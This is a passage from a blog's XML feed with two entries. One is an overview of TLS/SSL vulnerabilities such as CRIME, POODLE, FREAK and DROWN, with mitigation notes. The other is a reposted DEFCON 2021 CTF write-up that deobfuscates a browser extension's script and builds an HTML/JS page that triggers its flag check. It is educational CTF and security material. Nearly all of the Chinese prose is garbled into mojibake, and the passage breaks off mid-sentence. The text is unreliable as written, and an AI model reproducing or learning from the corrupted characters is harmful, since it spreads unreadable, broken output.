æˆçš„å®‰å…¨éšæ‚£ï¼Œé€šè¿‡å®ƒå¯çªƒå–å¯ç”¨æ•°æ®å‹ç¼©ç‰¹æ€§çš„HTTPSæˆ–SPDYåè®®ä¼ è¾“çš„ç§å¯†Web Cookieã€‚åœ¨æˆåŠŸè¯»å–èº«ä»½éªŒè¯Cookieåï¼Œæ”»å‡»è€…å¯ä»¥å®è¡Œä¼šè¯åŠ«æŒå’Œå‘åŠ¨è¿›ä¸€æ­¥æ”»å‡»ã€‚</p><p>SSL å‹ç¼©åœ¨ä¸‹è¿°ç‰ˆæœ¬æ˜¯é»˜è®¤å…³é—­çš„ï¼š nginx 1.1.6åŠæ›´é«˜/1.0.9åŠæ›´é«˜ï¼ˆå¦‚æœä½¿ç”¨äº† OpenSSL 1.0.0åŠæ›´é«˜ï¼‰ï¼Œ nginx 1.3.2åŠæ›´é«˜/1.2.2åŠæ›´é«˜ï¼ˆå¦‚æœä½¿ç”¨è¾ƒæ—§ç‰ˆæœ¬çš„ OpenSSLï¼‰ã€‚</p><p>å¦‚æœä½ ä½¿ç”¨ä¸€ä¸ªæ—©æœŸç‰ˆæœ¬çš„ nginx æˆ– OpenSSLï¼Œè€Œä¸”ä½ çš„å‘è¡Œç‰ˆæ²¡æœ‰å‘åç§»æ¤è¯¥é€‰é¡¹ï¼Œé‚£ä¹ˆä½ éœ€è¦é‡æ–°ç¼–è¯‘æ²¡æœ‰ä¸€ä¸ª ZLIB æ”¯æŒçš„ OpenSSLã€‚è¿™ä¼šç¦æ­¢ OpenSSL ä½¿ç”¨ DEFLATE å‹ç¼©æ–¹å¼ã€‚å¦‚æœä½ ç¦ç”¨äº†è¿™ä¸ªï¼Œä½ ä»ç„¶å¯ä»¥ä½¿ç”¨å¸¸è§„çš„ HTML DEFLATE å‹ç¼©ã€‚</p><h3 id="POODLEæ¼æ´ï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰"><a href="#POODLEæ¼æ´ï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰" class="headerlink" title="POODLEæ¼æ´ï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰"></a>POODLEæ¼æ´ï¼ˆå·æ¯›ç‹—æ”»å‡»ï¼‰</h3><p>2014å¹´10æœˆ14å·ç”±Googleå‘ç°çš„POODLEæ¼æ´ï¼Œå…¨ç§°æ˜¯Padding Oracle On Downloaded Legacy Encryption vulnerabilityï¼Œåˆè¢«ç§°ä¸ºâ€œè´µå®¾çŠ¬æ”»å‡»â€ï¼ˆCVE-2014-3566ï¼‰ï¼ŒPOODLEæ¼æ´åªå¯¹CBCæ¨¡å¼çš„æ˜æ–‡è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹å¡«å……å­—èŠ‚è¿›è¡Œå®Œæ•´æ€§éªŒè¯ï¼Œæ”»å‡»è€…çªƒå–é‡‡ç”¨SSL3.0ç‰ˆåŠ å¯†é€šä¿¡è¿‡ç¨‹ä¸­çš„å†…å®¹ï¼Œå¯¹å¡«å……å­—èŠ‚ä¿®æ”¹å¹¶ä¸”åˆ©ç”¨é¢„ç½®å¡«å……æ¥æ¢å¤åŠ å¯†å†…å®¹ï¼Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚</p><h3 id="TLS-POODLEï¼ˆTLSå·æ¯›ç‹—æ”»å‡»ï¼‰"><a href="#TLS-POODLEï¼ˆTLSå·æ¯›ç‹—æ”»å‡»ï¼‰" class="headerlink" title="TLS POODLEï¼ˆTLSå·æ¯›ç‹—æ”»å‡»ï¼‰"></a>TLS POODLEï¼ˆTLSå·æ¯›ç‹—æ”»å‡»ï¼‰</h3><p>TLS POODLE(CVE-2014-8730) è¯¥æ¼æ´çš„åŸç†å’ŒPOODLEæ¼æ´çš„åŸç†ä¸€è‡´ï¼Œä½†ä¸æ˜¯SSL3åè®®ã€‚ç”±äºTLSå¡«å……æ˜¯SSLv3çš„ä¸€ä¸ªå­é›†ï¼Œå› æ­¤å¯ä»¥é‡æ–°ä½¿ç”¨é’ˆå¯¹TLSçš„POODLEæ”»å‡»ã€‚TLSå¯¹äºå®ƒçš„å¡«å……æ ¼å¼æ˜¯éå¸¸ä¸¥æ ¼çš„ï¼Œä½†æ˜¯ä¸€äº›TLSå®ç°åœ¨è§£å¯†ä¹‹åä¸æ‰§è¡Œå¡«å……ç»“æ„çš„æ£€æŸ¥ã€‚å³ä½¿ä½¿ç”¨TLSä¹Ÿä¸ä¼šå®¹æ˜“å—åˆ°POODLEæ”»å‡»çš„å½±å“ã€‚</p><h3 id="CCS"><a href="#CCS" class="headerlink" title="CCS"></a>CCS</h3><p>CCS(CVE-2014-0224) å…¨ç§°openssl MITM CCS injection attackï¼ŒOpenssl 0.9.8zaä¹‹å‰çš„ç‰ˆæœ¬ã€1.0.0mä¹‹å‰çš„ä»¥åŠ1.0.1hä¹‹å‰çš„opensslæ²¡æœ‰é€‚å½“çš„é™åˆ¶ChangeCipherSpecä¿¡æ¯çš„å¤„ç†ï¼Œè¿™å…è®¸ä¸­é—´äººæ”»å‡»è€…åœ¨é€šä¿¡ä¹‹é—´ä½¿ç”¨0é•¿åº¦çš„ä¸»å¯†é’¥ã€‚</p><h3 id="FREAK"><a href="#FREAK" class="headerlink" title="FREAK"></a>FREAK</h3><p>FREAK(CVE-2015-0204) å®¢æˆ·ç«¯ä¼šåœ¨ä¸€ä¸ªå…¨å®‰å…¨å¼ºåº¦çš„RSAæ¡æ‰‹è¿‡ç¨‹ä¸­æ¥å—ä½¿ç”¨å¼±å®‰å…¨å¼ºåº¦çš„å‡ºå£RSAå¯†é’¥ï¼Œå…¶ä¸­å…³é”®åœ¨äºå®¢æˆ·ç«¯å¹¶æ²¡æœ‰å…è®¸åå•†ä»»ä½•å‡ºå£çº§åˆ«çš„RSAå¯†ç å¥—ä»¶ã€‚</p><h3 id="DROWNï¼ˆæººæ°´æ”»å‡»-æººäº¡æ”»å‡»ï¼‰"><a href="#DROWNï¼ˆæººæ°´æ”»å‡»-æººäº¡æ”»å‡»ï¼‰" class="headerlink" title="DROWNï¼ˆæººæ°´æ”»å‡»/æººäº¡æ”»å‡»ï¼‰"></a>DROWNï¼ˆæººæ°´æ”»å‡»/æººäº¡æ”»å‡»ï¼‰</h3><p>2016å¹´3æœˆå‘ç°çš„é’ˆå¯¹TLSçš„æ–°æ¼æ´æ”»å‡»â€”â€”DROWNï¼ˆDecrypting RSA with Obsolete and Weakened eNcryptionï¼ŒCVE-2016-0800ï¼‰ï¼Œä¹Ÿå³åˆ©ç”¨è¿‡æ—¶çš„ã€å¼±åŒ–çš„ä¸€ç§RSAåŠ å¯†ç®—æ³•æ¥è§£å¯†ç ´è§£TLSåè®®ä¸­è¢«è¯¥ç®—æ³•åŠ å¯†çš„ä¼šè¯å¯†é’¥ã€‚ å…·ä½“è¯´æ¥ï¼ŒDROWNæ¼æ´å¯ä»¥åˆ©ç”¨è¿‡æ—¶çš„SSLv2åè®®æ¥è§£å¯†ä¸ä¹‹å…±äº«ç›¸åŒRSAç§é’¥çš„TLSåè®®æ‰€ä¿æŠ¤çš„æµé‡ã€‚ DROWNæ”»å‡»ä¾èµ–äºSSLv2åè®®çš„è®¾è®¡ç¼ºé™·ä»¥åŠçŸ¥åçš„Bleichenbacheræ”»å‡»ã€‚</p><p>é€šå¸¸æ£€æŸ¥ä»¥ä¸‹ä¸¤ç‚¹æœåŠ¡å™¨çš„é…ç½®</p><ul><li>æœåŠ¡å™¨å…è®¸SSL2è¿æ¥ï¼Œéœ€è¦å°†å…¶å…³é—­ã€‚</li><li>ç§é’¥åŒæ—¶ç”¨äºå…è®¸SSL2è¿æ¥çš„å…¶ä»–æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼ŒWebæœåŠ¡å™¨å’Œé‚®ä»¶æœåŠ¡å™¨ä¸Šä½¿ç”¨ç›¸åŒçš„ç§é’¥å’Œè¯ä¹¦ï¼Œå¦‚æœé‚®ä»¶æœåŠ¡å™¨æ”¯æŒSSL2ï¼Œå³ä½¿webæœåŠ¡å™¨ä¸æ”¯æŒSSL2ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥ç ´åä¸webæœåŠ¡å™¨çš„TLSè¿æ¥ã€‚</li></ul><h3 id="Openssl-Padding-Oracle"><a href="#Openssl-Padding-Oracle" class="headerlink" title="Openssl Padding Oracle"></a>Openssl Padding Oracle</h3><p>Openssl Padding Oracle(CVE-2016-2107) openssl 1.0.1tåˆ°openssl 1.0.2hä¹‹å‰æ²¡æœ‰è€ƒè™‘æŸäº›å¡«å……æ£€æŸ¥æœŸé—´çš„å†…å­˜åˆ†é…ï¼Œè¿™å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡é’ˆå¯¹AES CBCä¼šè¯çš„padding-oracleæ”»å‡»æ¥è·å–æ•æ„Ÿçš„æ˜æ–‡ä¿¡æ¯ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://segmentfault.com/a/1190000012731888">https://segmentfault.com/a/1190000012731888</a></li><li><a href="https://segmentfault.com/a/1190000021559557">https://segmentfault.com/a/1190000021559557</a></li><li><a href="https://zhuanlan.zhihu.com/p/22142170">https://zhuanlan.zhihu.com/p/22142170</a></li><li><a href="https://juejin.cn/post/6844904089495535624#heading-14">https://juejin.cn/post/6844904089495535624#heading-14</a></li><li><a href="https://zhuanlan.zhihu.com/p/22917510">https://zhuanlan.zhihu.com/p/22917510</a></li><li><a href="https://payloads.online/archivers/2018-04-27/5">https://payloads.online/archivers/2018-04-27/5</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¹‹å‰å®ä¹ é¢è¯•ä¹‹å‰å»å‚è€ƒäº† Annevi çš„åšå®¢ï¼Œ&lt;/p&gt;
&lt;p&gt;å‘ç°äº†å¾ˆå¤šå¾ˆæ£’çš„è®°å½•ï¼Œ&lt;/p&gt;
&lt;p&gt;æ‰“ç®—è½¬è½½ä¸€äº›&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DEFCON 2021 Quals threefactooorx</title>
    <link href="https://me.liki.link/20210503/DEFCON-2021-Quals-threefactooorx/"/>
    <id>https://me.liki.link/20210503/DEFCON-2021-Quals-threefactooorx/</id>
    <published>2021-05-03T03:50:25.000Z</published>
    <updated>2021-10-18T03:57:17.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON-2021-Quals-threefactooorx"><a href="#DEFCON-2021-Quals-threefactooorx" class="headerlink" title="DEFCON 2021 Quals threefactooorx"></a>DEFCON 2021 Quals threefactooorx</h1><p>ç›´æ¥è½¬ 4qE çš„äº† 233</p><h2 id="åæ··æ·†"><a href="#åæ··æ·†" class="headerlink" title="åæ··æ·†"></a>åæ··æ·†</h2><p>æ’ä»¶æºç çš„ä¸»è¦éƒ¨åˆ†åœ¨ <code>content_script.js</code>ï¼Œ ä½†å› ä¸ºç»è¿‡æ··æ·†ï¼Œæ ¹æœ¬ä¸æ˜¯ç»™äººçœ‹çš„ï¼Œäºæ˜¯å¾—å…ˆåæ··æ·†ã€‚è€ƒè™‘åˆ° js æœ¬èº«å°±æ˜¯è§£é‡Šå‹è¯­è¨€ï¼Œæˆ‘å¯ä»¥ç›´æ¥åœ¨ chrome devtools ä¸­ä¸‹æ–­ç‚¹ï¼Œç„¶ååœ¨ console é‡Œæ‰“å°æˆ‘æƒ³è¦çš„å˜é‡å€¼ã€‚æœ€å¤–å±‚çš„å‡½æ•°ä¸æ˜¯ç‰¹åˆ«å¤šï¼Œæ‰€ä»¥ä¾æ¬¡ä¸‹æ–­ç‚¹é…åˆ devtools çš„æ§åˆ¶å°è·å–å˜é‡ã€‚</p><p>è¿™æ®µè¿‡ç¨‹éƒ½æ˜¯ä½“åŠ›æ´»ï¼Œå°±ä¸å…·ä½“æè¿°äº†ï¼Œæœ€ååæ··æ·†å‡ºäº†å¤§è‡´èƒ½çœ‹çš„ js ä»£ç  <a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/readable_code.js">readable_code.js</a>ã€‚</p><p>æœ€åçœ‹ä¸‹æ¥ï¼Œåæ··æ·†çš„éƒ¨åˆ†æ˜¯æœ€é‡è¦çš„ï¼Œå› ä¸ºåé¢çš„åˆ†æéƒ½ä¸æ˜¯å¾ˆéš¾ã€‚</p><h2 id="æœ¬åœ°åˆ†æ"><a href="#æœ¬åœ°åˆ†æ" class="headerlink" title="æœ¬åœ°åˆ†æ"></a>æœ¬åœ°åˆ†æ</h2><p>åæ··æ·†ä»¥åï¼Œå¯ä»¥çœ‹åˆ°åœ¨æºç çš„æœ€åæœ‰ä¸€æ®µä»£ç ä¼šå®šæ—¶å‘åå°è·å– flag å¹¶è¾“å‡ºã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">observer<span class="token punctuation">[</span><span class="token string">"observe"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">,</span>    console<span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"The observer is observing."</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> _0xd26915 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      _0xd26915<span class="token punctuation">[</span><span class="token string">"getflag"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _0x10b2d5<span class="token punctuation">[</span><span class="token string">"xOsuT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">//true</span>          chrome<span class="token punctuation">[</span><span class="token string">"runtime"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"sendMessage"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0xd26915<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x336e82</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// _0x336382 is response from backend included with flag</span>            <span class="token constant">FLAG</span> <span class="token operator">=</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                console<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"flag: "</span> <span class="token operator">+</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// four &amp;&amp; and display flag on the #thirdfactooor</span>            nodesadded <span class="token operator">==</span> <span class="token number">5</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodesdeleted <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> \            attrcharsadded <span class="token operator">==</span> <span class="token number">23</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>domvalue <span class="token operator">==</span> <span class="token number">2188</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> \             <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"thirdfactooor"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// append new div</span>            <span class="token keyword">const</span> _0x369bcb <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            _0x369bcb<span class="token punctuation">[</span><span class="token string">"setAttribute"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"processed"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                document<span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x369bcb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­è¿™ä¸ª <code>document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;)</code> æ˜¯åœ¨ <code>check_dom()</code> ä¼šè¿›è¡Œçš„ä¸€é¡¹æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦è®© html ä¸­æœ‰ä¸€ä¸ª id ä¸º <code>thirdfactooor</code> çš„ <code>input</code> æ ‡ç­¾ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"querySelector"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"thirdfactooor"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"tagName"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"INPUT"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åªéœ€è¦æ»¡è¶³</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">nodesadded <span class="token operator">==</span> <span class="token number">5</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodesdeleted <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> attrcharsadded <span class="token operator">==</span> <span class="token number">23</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>domvalue <span class="token operator">==</span> <span class="token number">2188</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¾æ¬¡æ‰¾åˆ°èµ‹å€¼çš„åœ°æ–¹</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* > _0x8a010b instanceof MutationRecord &lt;Â· true*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"childList"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// never execute</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        nodesadded <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"addedNodes"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        nodesdeleted <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"removedNodes"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"attributes"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            attrcharsadded <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"attributeName"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™é‡Œå­¦ä¹ äº†ä¸€ä¸‹ <code>MutationRecord</code> çš„å‡½æ•°ï¼Œ<a href="https://www.javascripture.com/MutationRecord">MutationRecord JavaScript API</a>ã€‚ <code>type</code> ä¼šéšç€ä¸åŒçš„æ“ä½œæ”¹å˜</p><ul><li>æ”¹å˜ <code>Node.childNodes</code> æ—¶ä¼šå˜æˆ <code>childList</code></li><li>æ”¹å˜ <code>Element.attribute</code> æ—¶ä¼šå˜æˆ <code>attributes</code></li></ul><p>æŒ‰è¦æ±‚æˆ‘ä»¬éœ€è¦5æ¬¡èŠ‚ç‚¹å¢åŠ ï¼Œ3æ¬¡èŠ‚ç‚¹ç§»é™¤ï¼Œæ”¹å˜çš„å±æ€§åçš„é•¿åº¦æ€»å’Œä¸º23ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™æ®µèµ‹å€¼æ“ä½œå‰ï¼Œæœ‰ä¸€å¤„åˆ¤æ–­ä¼šå¯¼è‡´ç¨‹åºæå‰é€€å‡ºã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> _0x5b12b9 <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"3fa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9<span class="token punctuation">)</span> <span class="token operator">||</span> \_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9 <span class="token operator">||</span> \_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ id ä¸º <code>#3fa</code> çš„èŠ‚ç‚¹å¿…é¡»æ˜¯æ ¹èŠ‚ç‚¹ï¼ˆå¯ä»¥ç›´æ¥ç»™ <code>&lt;html&gt;</code> ï¼‰ã€‚</p><p>æ¥ä¸‹æ¥åœ¨è°ƒè¯•çš„æ—¶å€™è§‚å¯Ÿåˆ° <code>domvalue</code> ä¸ <code>.html</code> æ–‡ä»¶ä¸­çš„å­—æ•°æœ‰å…³ï¼Œå‡‘è¶³ä¸€å®šçš„å­—æ•°å³å¯ã€‚</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>thirdfactooor<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">let</span> fa <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fa<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"3fa"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        fa<span class="token punctuation">.</span>lang <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 2 + 4 chars * 4 + 5</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> b <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> d <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ”¾åœ¨æœ¬åœ°è·‘ï¼ŒæˆåŠŸ</p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png" alt="poc" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png" class="lozad post-image"></a></p><h2 id="Capture-the-flag"><a href="#Capture-the-flag" class="headerlink" title="Capture the flag"></a>Capture the flag</h2><p>è¿œç¨‹æœåŠ¡æä¾›äº†ä¸€ä¸ª <code>/submit</code> æ¥å£ï¼Œå¯ä»¥æäº¤æˆ‘ä»¬çš„ html æ–‡ä»¶ï¼Œç„¶åä¼šç”¨ç±»ä¼¼ç»™è¿™ä¸ª html â€œæ‹ç…§â€çš„æ–¹å¼ï¼Œä»¥å›¾ç‰‡æ 